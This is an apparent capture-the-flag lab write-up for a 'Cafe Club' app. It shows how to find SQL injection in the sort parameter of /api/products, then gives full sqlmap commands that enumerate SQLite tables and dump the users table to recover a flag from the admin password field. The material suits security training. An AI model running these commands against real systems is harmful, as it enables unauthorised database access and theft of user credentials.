# Cafe Club — Inject all the things.

## Step 1 — Find the products API

Open the Cafe Club application and open Firefox → Developer Tools → Network.

Load the products page.

You should see a request similar to:
```
GET /api/products
```
The API accepts parameters such as search and, importantly, sort.

## Step 2 — Test the sort parameter normally

Send:
```
GET /api/products?sort=id DESC
```
The response should return the products in descending ID order:
```json
16
15
14
13
...
3
2
1
```
This demonstrates that the server processes the sort parameter. So it's confirmed this is the injection point. Since you've already identified GET /api/products?sort=... as a potentially injectable parameter, let SQLmap do the repetitive differential testing. 

## Step 3 — Run SQLmap against sort

On Kali Linux, run:
```bash
sqlmap -u "https://<YOUR-LAB-HOST>/api/products?sort=price" \
-p sort \
--technique=B \
--level=3 \
--headers="Authorization: Bearer <YOUR_JWT>" \
--dbms=sqlite \
--tables \
--threads=10 \
--no-cast
```
Replace:

<YOUR-LAB-HOST>

with your currently running Cafe Club hostname.

And replace:

<YOUR_JWT>

with your own JWT.

## Step 4 — Wait for SQLmap to test sort

SQLmap eventually reported:

GET parameter 'sort' appears to be
'SQLite AND boolean-based blind
- WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
injectable

It then confirmed:

Parameter: sort (GET)
Type: boolean-based blind

and:

back-end DBMS: SQLite

So at this point you have confirmed SQL injection.

## Step 5 — Enumerate the database tables

You used:

--tables

SQLmap retrieved 12 tables:
```bash
cart_items
favorites
gift_cards
order_items
order_status_history
orders
password_resets
products
reviews
sqlite_sequence
user_gift_cards
users
```
The important table is:

users

SQLmap's enumeration shows the users table among the database tables.

## Step 6 — Dump the users table

Now run:
```bash
sqlmap -u "https://YOUR-LAB-HOST/api/products?sort=price" \
-p sort \
--technique=B \
--level=3 \
--headers="Authorization: Bearer <YOUR_JWT>" \
--dbms=sqlite \
-T users \
--dump \
--threads=10 \
--no-cast
```
The important options are:

-T users

→ target the users table.

--dump

→ retrieve its contents.

## Step 7 — Look for the admin account

SQLmap identified the table structure as:

CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    email TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    full_name TEXT,
    address TEXT,
    phone TEXT,
    points INTEGER DEFAULT 0,
    role TEXT DEFAULT 'user',
    avatar_url TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)

It found 5 users.

During the dump, the first row retrieved was:

id:        1
username:  admin
email:     admin@cafeclub.com
role:      admin

## Step 8 — Flag

The password field contained the Cafe Club flag:
```bash
bug{4YIKR0BQ11rmOjCql4z1gvUzi1wkeIzn}
```
The whole attack chain
Cafe Club
    ↓
/api/products
    ↓
sort parameter
    ↓
sort=id DESC works
    ↓
SQLmap
    ↓
Boolean-based blind SQL injection
    ↓
SQLite
    ↓
--tables
    ↓
users table
    ↓
-T users --dump
    ↓
admin account
    ↓
password field
    ↓
FLAG

Key lesson: the vulnerable input wasn't the product ID. The useful injection point was the sort query parameter on /api/products.